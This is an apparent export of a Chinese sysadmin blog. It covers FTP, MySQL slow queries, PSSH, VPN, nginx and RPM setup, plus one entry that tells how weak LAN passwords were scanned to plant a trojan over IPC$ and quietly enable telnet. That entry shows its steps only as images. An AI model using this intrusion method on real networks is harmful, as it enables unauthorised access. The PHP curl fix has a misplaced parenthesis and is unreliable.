<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-17210.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image18083.png" alt="wps_clip_image-18083" title="wps_clip_image-18083"></a></p>
<p>9.在浏览器输入框中，输入ftp://您的FTP服务器IP地址：</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image1375.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image1375_thumb.png" alt="wps_clip_image-1375" title="wps_clip_image-1375"></a></p>
<p>10.输入完成后，进行登录测试：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-18557.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image26258.png" alt="wps_clip_image-26258" title="wps_clip_image-26258"></a></p>
<p>登录之后，您可以使用该FTP用户进行上传下载及其他方面的操作。</p>
<p>注意：如果在安装过程中windows自带的系统防火墙开启或是在安装完成后打开windows自带的系统防火墙，FileZilla Server中建立的用户将无法连接到FTP服务器，这时，我们需要在系统防火墙中将FileZilla Server添加到例外选项。具体操作见下面的图示：</p>
<p>1.右键网络连接中的本地连接，选择属性按钮：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-14956.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image18158.png" alt="wps_clip_image-18158" title="wps_clip_image-18158"></a></p>
<p>2.在本地连接属性中，选择高级，点击设置按钮：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-27367.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image17775.png" alt="wps_clip_image-17775" title="wps_clip_image-17775"></a></p>
<p>3.下图显示的是系统防火墙开启的界面：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-5520.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image10465.png" alt="wps_clip_image-10465" title="wps_clip_image-10465"></a></p>
<p>4.在windows防火墙选项中，选择例外，点击添加程序按钮：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-13428.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image26779.png" alt="wps_clip_image-26779" title="wps_clip_image-26779"></a></p>
<p>5.在添加程序的目录下，FileZilla Server的主程序有可能不在下面的列表中，这时需要我们手动浏览到FileZilla Server的安装目录，将FileZilla Server的主程序添加进来：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-16796.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image5738.png" alt="wps_clip_image-5738" title="wps_clip_image-5738"></a></p>
<p>6.在FileZilla Server的安装目录中，将下面的两个程序都添加进去：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-18777.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image1143.png" alt="wps_clip_image-1143" title="wps_clip_image-1143"></a></p>
<p>7.添加完成后的界面如下图显示：</p>
<p>.<a href="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image22676.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image22676_thumb.png" alt="wps_clip_image-22676" title="wps_clip_image-22676"></a><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-7795.png" target="_blank" rel="external"></a></p>
<p>添加完成后，点确定，然后输入<a href="ftp://您的FTP服务器IP地址" target="_blank" rel="external">ftp://您的FTP服务器IP地址</a>&#160; 进行测试。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql配置开启慢查询和查看慢查询的方法]]></title>
      <url>/2013/03/12/mysql-e9-85-8d-e7-bd-ae-e5-bc-80-e5-90-af-e6-85-a2-e6-9f-a5-e8-af-a2-e5-92-8c-e6-9f-a5-e7-9c-8b-e6-85-a2-e6-9f-a5-e8-af-a2-e7-9a-84-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p><strong>1，配置开启     
</strong></p>
<p>Linux:</p>
<p>在mysql配置文件my.cnf中增加</p>
<p>log-slow-queries=/var/lib/mysql/slowquery.log (指定日志文件存放位置，可以为空，系统会给一个缺省的文件host_name-slow.log)<br>long_query_time=2 (记录超过的时间，默认为10s)<br>log-queries-not-using-indexes (log下来没有使用索引的query,可以根据情况决定是否开启)<br>log-long-format (如果设置了，所有没有使用索引的查询也将被记录)</p>
<p>Windows:</p>
<p>在my.ini的[mysqld]添加如下语句：<br>log-slow-queries = E:webmysqllogmysqlslowquery.log<br>long_query_time = 2(其他参数如上)</p>
<p><strong>2,查看方式</strong></p>
<p>Linux:</p>
<p>使用mysql自带命令mysqldumpslow查看</p>
<p>常用命令<br>-s ORDER what to sort by (t, at, l, al, r, ar etc), ‘at’ is default<br>-t NUM just show the top n queries<br>-g PATTERN grep: only consider stmts that include this string</p>
<p>eg:<br>s，是order的顺序，说明写的不够详细，俺用下来，包括看了代码，主要有 c,t,l,r和ac,at,al,ar，分别是按照query次数，时间，lock的时间和返回的记录数来排序，前面加了a的时倒序 -t，是top n的意思，即为返回前面多少条的数据 -g，后边可以写一个正则匹配模式，大小写不敏感的</p>
<p>mysqldumpslow -s c -t 20 host-slow.log<br>mysqldumpslow -s r -t 20 host-slow.log<br>上述命令可以看出访问次数最多的20个sql语句和返回记录集最多的20个sql。</p>
<p>mysqldumpslow -t 10 -s t -g “left join” host-slow.log这个是按照时间返回前10条里面含有左连接的sql语句。</p>
<p>mysql慢查询日志对于跟踪有问题的查询非常有用,可以分析出当前程序里有很耗费资源的sql语句,那如何打开mysql的慢查询日志记录呢?<br>其实打开mysql的慢查询日志很简单,只需要在mysql的配置文件里(windows系统是my.ini,linux系统是my.cnf)的[mysqld]下面加上如下代码：</p>
<p><code>log-slow-queries=/var/lib/mysql/slowquery.log</code><br><code>long_query_time=2</code></p>
<p>注:<br>log-slow-queries 设置把<strong>日志</strong>写在那里，为空的时候，系统会给慢查询日志赋予主机名，并被附加slow.log. /var/lib/mysql/slowquery.log为日志存放的文件的位置,一般这个目录要有mysql的运行帐号的可写权限,一般都将这个目录设置为mysql的数据存放目录</p>
<p>long_query_time=2中的2表示查询超过两秒才记录.</p>
<p>如果设置了参数log-long-format，那么所有没有使用索引的查询也将被记录。在文件my.cnf或my.ini中加入下面这一行可以记录这些查询</p>
<p>这是一个有用的日志。它对于性能的影响不大（假设所有查询都很快），并且强调了那些最需要注意的查询（丢失了索引或索引没有得到最佳应用）</p>
<h1 id="Time-070927-8-08-52"><a href="#Time-070927-8-08-52" class="headerlink" title="Time: 070927 8:08:52"></a>Time: 070927 8:08:52</h1><h1 id="User-Host-root-root-192-168-0-20"><a href="#User-Host-root-root-192-168-0-20" class="headerlink" title="User@Host: root[root] @ [192.168.0.20]"></a>User@Host: root[root] @ [192.168.0.20]</h1><h1 id="Query-time-372-Lock-time-136-Rows-sent-152-Rows-examined-263630"><a href="#Query-time-372-Lock-time-136-Rows-sent-152-Rows-examined-263630" class="headerlink" title="Query_time: 372 Lock_time: 136 Rows_sent: 152 Rows_examined: 263630"></a>Query_time: 372 Lock_time: 136 Rows_sent: 152 Rows_examined: 263630</h1><p>select id, name from manager where id in (66,10135);<br>这是慢查询日志中的一条，用了372秒，锁了136秒，返回152行，一共查了263630行</p>
<p>如果日志内容很多，用眼睛一条一条去看会累死，mysql自带了分析的工具，使用方法如下：<br>命令行下，进入mysql/bin目录，输入mysqldumpslow –help或–help可以看到这个工具的参数，主要有<br>Usage: mysqldumpslow [ OPTS… ] [ LOGS… ]</p>
<p>Parse and summarize the MySQL slow query log. Options are</p>
<p>–verbose&#160;&#160;&#160; verbose</p>
<p>–debug&#160;&#160;&#160;&#160;&#160; debug</p>
<p>–help&#160;&#160;&#160;&#160;&#160;&#160; write this text to standard output</p>
<p>-v&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; verbose</p>
<p>-d&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; debug</p>
<p>-s ORDER&#160;&#160;&#160;&#160; what to sort by (t, at, l, al, r, ar etc), ‘at’ is default</p>
<p>-r&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; reverse the sort order (largest last instead of first)</p>
<p>-t NUM&#160;&#160;&#160;&#160;&#160;&#160; just show the top n queries</p>
<p>-a&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; don’t abstract all numbers to N and strings to ‘S’</p>
<p>-n NUM&#160;&#160;&#160;&#160;&#160;&#160; abstract numbers with at least n digits within names</p>
<p>-g PATTERN&#160;&#160; grep: only consider stmts that include this string</p>
<p>-h HOSTNAME hostname of db server for *-slow.log filename (can be wildcard),</p>
<p>default is ‘*’, i.e. match all</p>
<p>-i NAME&#160;&#160;&#160;&#160;&#160; name of server instance (if using mysql.server startup scrīpt)</p>
<p>-l&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; don’t subtract lock time from total time</p>
<p>-s，是order的顺序，说明写的不够详细，俺用下来，包括看了代码，主要有<br>c,t,l,r和ac,at,al,ar，分别是按照query次数，时间，lock的时间和返回的记录数来排序，前面加了a的时倒叙<br>-t，是top n的意思，即为返回前面多少条的数据<br>-g，后边可以写一个正则匹配模式，大小写不敏感的</p>
<p>mysqldumpslow -s c -t 20 host-slow.log<br>mysqldumpslow -s r -t 20 host-slow.log</p>
<p>上述命令可以看出访问次数最多的20个sql语句和返回记录集最多的20个sql。<br>mysqldumpslow -t 10 -s t -g “left join” host-slow.log<br>这个是按照时间返回前10条里面含有左连接的sql语句。</p>
<p>Windows:</p>
<p>当你是第一次开启mysql的慢查询，会在你指定的目录下创建这个记录文件，本文就是mysqlslowquery.log，这个文件的内容大致如下(第一次开启MYSQL慢查询的情况下)<br>E:webmysqlbinmysqld, Version: 5.4.3-beta-community-log (MySQL Community Server (GPL)). started with:<br>TCP Port: 3306, Named Pipe: (null)<br>Time Id Command Argument</p>
<p>可以通过如下的命令来查看慢查询的记录数：</p>
<p>mysql&gt; show global status like ‘%slow%’;<br>+———————+——-+<br>| Variable_name | Value |<br>+———————+——-+<br>| Slow_launch_threads | 0 |<br>| Slow_queries | 0 |<br>+———————+——-+</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PSSH 批量管理服务器]]></title>
      <url>/2013/03/01/743.html</url>
      <content type="html"><![CDATA[<p>想找一个轻量的批量管理机器的工具，网上搜了一下发现有介绍pssh这个工具，用python写的，python版本大于2.4即可，于是下载试了一下。</p>
<p>&#160;</p>
<p>&#160;&#160;&#160;&#160;&#160; 1 下载wget <a href="http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz" target="_blank" rel="external">http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz</a><br>&#160;&#160;&#160;&#160;&#160; 2 安装tar zxvf pssh-2.3.1.tar.gz<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; cd pssh-2.3.1/<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; python setup.py install<br>&#160;&#160;&#160;&#160;&#160; 3.安装结果changing mode of /usr/local/bin/pnuke to 755<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; changing mode of /usr/local/bin/pscp to 755<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; changing mode of /usr/local/bin/pslurp to 755<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; changing mode of /usr/local/bin/pssh to 755<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; changing mode of /usr/local/bin/pssh-askpass to 755<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; changing mode of /usr/local/bin/prsync to 755安装完后最后面几行会显示如上结果，显示安装了几个命令，分别安装在哪里。</p>
<p>&#160;</p>
<p>&#160;&#160;&#160; 4 介绍pssh参数</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -h 执行命令的远程主机列表&#160; 或者 -H user@ip:port&#160; 文件内容格式[user@]host[:port]</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -l 远程机器的用户名</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -p 一次最大允许多少连接</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -o 输出内容重定向到一个文件</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -e 执行错误重定向到一个文件</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -t 设置命令执行的超时时间</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -A 提示输入密码并且把密码传递给ssh</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -O 设置ssh参数的具体配置，参照ssh_config配置文件</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -x 传递多个SSH 命令，多个命令用空格分开，用引号括起来</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -X 同-x 但是一次只能传递一个命令</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -i 显示标准输出和标准错误在每台host执行完毕后</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; -I 读取每个输入命令，并传递给ssh进程 允许命令脚本传送到标准输入</p>
<p>&#160;&#160;&#160;&#160; 5 介绍软件包内其他命令</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; pscp&#160;&#160; 传输文件到多个hosts，他的特性和scp差不多</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; pslurp&#160;&#160; 从多台远程机器拷贝文件</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; pnuke&#160;&#160;&#160; kill远程机器的进程</p>
<p>&#160;&#160;&#160;&#160; 6 试用pssh</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; 在ip.txt 输入你需要执行命令的远程机器，格式：user@ip:port</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; 结果如下，注意两个参数-i -P 显示结果的差别</p>
<p><a href="http://static.oschina.net/uploads/space/2012/0529/103245_cjjH_123777.jpg" target="_blank" rel="external"><img src="http://static.oschina.net/uploads/space/2012/0529/103245_cjjH_123777.jpg" alt=""></a></p>
<p>转自oschina</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[关于curl_setopt() [function.curl-setopt]: CURLOPT_FOLLOWLOCATION]]></title>
      <url>/2013/02/27/e5-85-b3-e4-ba-8ecurl-setopt-a-hreffunction-curl-setoptfunction-curl-setopta-curlopt-followlocation-cannot-be-activated-when-safe-mode-is-enabled-or-an-open-basedir-is-set.html</url>
      <content type="html"><![CDATA[<p><strong>问题描述：</strong>公司内部系统上测试环境，发现登录页面第一次登录时报</p>
<p>curl_setopt() [&lt;a href=’function.curl-setopt’&gt;function.curl-setopt&lt;/a&gt;]: CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set 错误，刷新后正常</p>
<p>其实很多问题都是由于code不当产生的，检查了一下php的配置safe_mode的确是关闭的，open_basedir将需要的目录加进去了，问题依然出现，做运维的没办法，开发非要说是服务端问题，可我认为是代码问题；先安coders们的说法做吧，把php的配置拷贝到了开发环境没有出现此类问题；好吧，我也说不准确到底是什么条件触发这个，因为我是一个伪coder；按照抛出的异常修改php代码吧，只好这样！so do it！</p>
<p>将curl_setopt ( $this-&gt;ch, $key, $value );替换</p>
<p>if (ini_get(‘open_basedir’) == ‘’ &amp;&amp; ini_get(‘safe_mode’ == ‘Off’))<br>&#160;&#160;&#160;&#160; curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 使用自动跳转</p>
<p>问题得到了解决！</p>
<p>也有可能是配置问题，但是没有找到原因，望资深攻城湿指点！</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[啊D扫内网弱口令，通过$IPC 种植木马]]></title>
      <url>/2013/02/25/e5-95-8ad-e6-89-ab-e5-86-85-e7-bd-91-e5-bc-b1-e5-8f-a3-e4-bb-a4-ef-bc-8c-e9-80-9a-e8-bf-87ipc-e7-a7-8d-e6-a4-8d-e6-9c-a8-e9-a9-ac.html</url>
      <content type="html"><![CDATA[<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/02/image.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/02/image_thumb.png" alt="image" title="image"></a> </p>
<p>种植木马</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/02/image1.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/02/image_thumb1.png" alt="image" title="image"></a> </p>
<p>由于对端没有开启3389，so&#160; 开启telnet 来的更直接 更不容易被普通用户发现</p>
<p>&#160;</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/02/image2.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/02/image_thumb2.png" alt="image" title="image"></a> </p>
<p>&#160;</p>
<p>ok，此刻 可以telnet登录了！ 就这么简单；希望搞运维的朋友 没事多检测下自个服务器的安全性，</p>
<p>多看看关于安全，多聚焦安全新闻；以攻击思想来防范！Good bye！</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[nginx配置中文域名]]></title>
      <url>/2013/01/22/nginx-e9-85-8d-e7-bd-ae-e4-b8-ad-e6-96-87-e5-9f-9f-e5-90-8d.html</url>
      <content type="html"><![CDATA[<p>当在浏览器中敲入www.明月博客.com时，浏览器会转为www.xn–9kRq6Qw2Iu2A.com<br>其实中文域名就是一个经过编码的英文域名（中文域名–&gt;punycode编码–&gt;英文域名）<br>在线转换地址<a href="http://www.webmasterhome.cn/tool/punycode.asp" target="_blank" rel="external">http://www.webmasterhome.cn/tool/punycode.asp</a><br>配置：<br>listen 80;<br>server_name www.xn–9kRq6Qw2Iu2A.com;<br>index index.html;  </p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows server 2008 搭建VPN服务]]></title>
      <url>/2013/01/15/windows-server-2008-e6-90-ad-e5-bb-bavpn-e6-9c-8d-e5-8a-a1.html</url>
      <content type="html"><![CDATA[<p>&#160;</p>
<p>VPN英文全称是“Virtual Private Network”，就是“<a href="http://baike.baidu.com/view/480950.htm" target="_blank" rel="external">虚拟专用网络”。</a></p>
<p>虚拟专用网络就是一种虚拟出来的企业内部专用线路、这条隧道可以对数据进行几倍加密达到安全使用互联网的目的。</p>
<p>此项技术已被广泛使用、虚拟专用网可以帮助远程用户、公司分支机构、商业伙伴及供应商同公司的内部网建立可信的安全连接，用于经济有效地连接到商业伙伴和用户的安全外联网虚拟专用网。</p>
<p>实验环境:</p>
<p>服务器系统:Windows server 2008</p>
<p>客户机系统:Windows server 2003</p>
<p>服务器双网卡</p>
<p>外网卡IP:192.168.2.253</p>
<p>内网卡IP:172.16.2.253</p>
<p>客户机IP:</p>
<p><a href="http://img1.51cto.com/attachment/201107/173208662.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173208662.jpg" alt=""></a></p>
<p>最终效果:客户机拨入VPN访问服务器内网、同时通过VPN服务器继续访问互联网</p>
<p>一、安装VPN服务</p>
<p>打开服务器管理器-添加角色</p>
<p><a href="http://img1.51cto.com/attachment/201107/173512759.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173512759.jpg" alt=""></a></p>
<p>勾选网络策略和访问服务</p>
<p><a href="http://img1.51cto.com/attachment/201107/173530284.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173530284.jpg" alt=""></a></p>
<p>下一步</p>
<p><a href="http://img1.51cto.com/attachment/201107/173711718.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173711718.jpg" alt=""></a></p>
<p>勾选需要安装的服务:如图</p>
<p><a href="http://img1.51cto.com/attachment/201107/173748698.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173748698.jpg" alt=""></a></p>
<p>下一步</p>
<p><a href="http://img1.51cto.com/attachment/201107/173833688.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173833688.jpg" alt=""></a></p>
<p>开始安装</p>
<p><a href="http://img1.51cto.com/attachment/201107/173901320.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173901320.jpg" alt=""></a></p>
<p>安装完成</p>
<p><a href="http://img1.51cto.com/attachment/201107/173929957.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173929957.jpg" alt=""></a></p>
<p>二、配置VPN服务</p>
<p>当安装完路由和远程访问默认是禁用的,看到的是红下箭头,需要进行配置才变绿</p>
<p><a href="http://img1.51cto.com/attachment/201107/173955125.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/173955125.jpg" alt=""></a></p>
<p>右击路由和远程访问-配置并启动路由与远程访问</p>
<p><a href="http://img1.51cto.com/attachment/201107/174301390.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/174301390.jpg" alt=""></a></p>
<p>选择自定义-下一步</p>
<p><a href="http://img1.51cto.com/attachment/201107/174422623.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/174422623.jpg" alt=""></a></p>
<p><a href="http://img1.51cto.com/attachment/201107/174702719.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/174702719.jpg" alt=""></a></p>
<p>配置完启动服务</p>
<p><a href="http://img1.51cto.com/attachment/201107/174718918.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/174718918.jpg" alt=""></a></p>
<p>已经可以看到变绿了!</p>
<p><a href="http://img1.51cto.com/attachment/201107/174744698.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/174744698.jpg" alt=""></a></p>
<p>展开以后-右击NAT-新增接口</p>
<p><a href="http://img1.51cto.com/attachment/201107/174840398.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/174840398.jpg" alt=""></a></p>
<p>选择本地接口-公用接口(连接互联网),并在此接口上启用NAT,不然客户机拨号进来就只能访问服务器内网,无法连接互联网</p>
<p><a href="http://img1.51cto.com/attachment/201107/175052342.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175052342.jpg" alt=""></a></p>
<p><a href="http://img1.51cto.com/attachment/201107/175119965.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175119965.jpg" alt=""></a></p>
<p>右击NAT-新增接口-内部-专用接口 (连接虚拟专用网络)</p>
<p><a href="http://img1.51cto.com/attachment/201107/175204245.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175204245.jpg" alt=""></a> <a href="http://img1.51cto.com/attachment/201107/175204135.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175204135.jpg" alt=""></a></p>
<p>右击路由和远程访问-属性-IPv4-静态地址池(用于指定客户机拨入VPN后,分配的IP范围,我指定IP是:172.16.2.100-200)</p>
<p><a href="http://img1.51cto.com/attachment/201107/175204755.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175204755.jpg" alt=""></a></p>
<p>创建一个名为sky的VPN用户-属性-允许拨入</p>
<p><a href="http://img1.51cto.com/attachment/201107/175204381.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175204381.jpg" alt=""></a></p>
<p><a href="http://img1.51cto.com/attachment/201107/175355659.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175355659.jpg" alt=""></a></p>
<p>客户机测试</p>
<p>1、测试能否正常拨入</p>
<p>2、测试能否访问服务器内网和互联网</p>
<p><a href="http://img1.51cto.com/attachment/201107/175355433.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175355433.jpg" alt=""></a> <a href="http://img1.51cto.com/attachment/201107/175355479.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175355479.jpg" alt=""></a> <a href="http://img1.51cto.com/attachment/201107/175356592.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175356592.jpg" alt=""></a></p>
<p>查看客户机成功拨入后的IP信息!</p>
<p><a href="http://img1.51cto.com/attachment/201107/175711218.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201107/175711218.jpg" alt=""></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[maptail实现实时、美观的用户访问视图]]></title>
      <url>/2013/01/04/713.html</url>
      <content type="html"><![CDATA[<p>转自liuts blog讲解，测试完了一下maptail，在线DEMO：<a href="http://view.linuxtone.org" target="_blank" rel="external">http://view.linuxtone.org</a><br><strong>一、效果图</strong><br><a href="http://t2.qpic.cn/mblogpic/1b8bb61880ea82f235d0/2000" target="_blank" rel="external"><img src="http://t2.qpic.cn/mblogpic/1b8bb61880ea82f235d0/2000" alt="点击在新窗口中浏览此图片" title="点击在新窗口中浏览此图片"></a></p>
<p><strong>二、安装</strong></p>
<p>1、依赖python2.6~2.7版本模块的支持，python已经是2.6或2.7版本略过此步骤</p>
<div><br><div><br><div><a href="http://blog.liuts.com/#" target="_blank" rel="external">view plain</a><a href="http://blog.liuts.com/#" target="_blank" rel="external">print</a><a href="http://blog.liuts.com/#" target="_blank" rel="external">?</a></div><br></div>

<ol>
<li>wget <a href="http://www.python.org/ftp/python/2.7.3/Python-2.7.3.tgz" target="_blank" rel="external">http://www.python.org/ftp/python/2.7.3/Python-2.7.3.tgz</a></li>
<li>tar -zxvf Python-2.7.3.tgz</li>
<li>cd Python-2.7.3</li>
<li>./configure</li>
<li>make;make install</li>
<li>cd /usr/bin</li>
<li>mv python python.bak</li>
<li><p>ln -s /usr/local/bin/python python<br></p></li></ol></div><br>2、安装nodeJS<p></p>
<div><br><div><br><div><a href="http://blog.liuts.com/#" target="_blank" rel="external">view plain</a><a href="http://blog.liuts.com/#" target="_blank" rel="external">print</a><a href="http://blog.liuts.com/#" target="_blank" rel="external">?</a></div><br></div>

<li><p>wget <a href="http://nodejs.org/dist/v0.8.16/node-v0.8.16.tar.gz" target="_blank" rel="external">http://nodejs.org/dist/v0.8.16/node-v0.8.16.tar.gz</a></p>
</li>
<li>tar -zxvf node-v0.8.16.tar.gz</li>
<li>cd node-v0.8.16</li>
<li>./configure</li>
<li><p>make;make install<br></p></li></div><br>3、模板安装maptail<p></p>
<div>

<li><p>npm install maptail -g<br></p></li></div><br><span style="color: red;">*npm作为一个在线管理NodeJS模块的工具，官方默认托管站<a href="https://registry.npmjs.org速度在国内很差，建议使用第三代理；推荐http://registry.npmjs.vitecho.com，使用方法：npm" target="_blank" rel="external">https://registry.npmjs.org速度在国内很差，建议使用第三代理；推荐http://registry.npmjs.vitecho.com，使用方法：npm</a> –registry “<a href="http://registry.npmjs.vitecho.com" target="_blank" rel="external">http://registry.npmjs.vitecho.com</a>“ install maptail -g</span><p></p>


<p>4、启用maptail监听<br>cd /var/log/httpd (以apache日志为例，系统支持任一带IP地址的日志格式，会自动匹配出IP规则)<br>nohup tail -f access.log |/maptail -h 192.168.1.5 -p 8080 &amp;</p>
<p>#开机自启动<br>echo “/usr/bin/nohup /usr/bin/tail -f /var/log/httpd/access_log|/usr/local/bin/node /usr/local/bin/maptail -h 192.168.1.5 -p 8080 &amp;” &gt;&gt; /etc/rc.local<br>打开浏览器访问：<a href="http://192.168.1.5:8080/" target="_blank" rel="external">http://192.168.1.5:8080/</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[简单介绍RPM包制作方法]]></title>
      <url>/2012/12/16/e7-ae-80-e5-8d-95-e4-bb-8b-e7-bb-8drpm-e5-8c-85-e5-88-b6-e4-bd-9c-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>RPM是RedHat Package Manager（RedHat软件包管理工具）的缩写,是一种用于互联网下载包的打包及安装工具，它包含在某些Linux分发版中。它生成具有.RPM扩展名的文件。使用rpm安装软件和管理软件非常的方便。而这节我们不是介绍如何使用rpm安装或管理软件，而是如何把源码制作成rpm包。<br>下面我们以制作nginx的rpm开始介绍其制作方法。以下操作在centos-5 32系统进行。<br>A<br>制作nginx的rpm例子<br><strong>1、建立目录结构</strong><br>/usr/src/redhat/SOURCES — 存放源代码，补丁，图标等文件。<br>/usr/src/redhat/SPECS — 存放用于管理rpm制作进程的spec文件。<br>/usr/src/redhat/BUILD — 解压后的文件存放在这里。<br>/usr/src/redhat/RPMS — 存放由rpmbuild制作好的二进制包。<br>/usr/src/redhat/SRPMS —存放由rpmbuild制作好的源码包。</p>
<p>mkdir -p /usr/src/redhat<br>cd /usr/src/redhat<br>mkdir SOURCES SPECS BUILD RPMS SRPMS<br><strong>2、下载源码包</strong><br>下载源码包到SOURCES目录，不需要解压。</p>
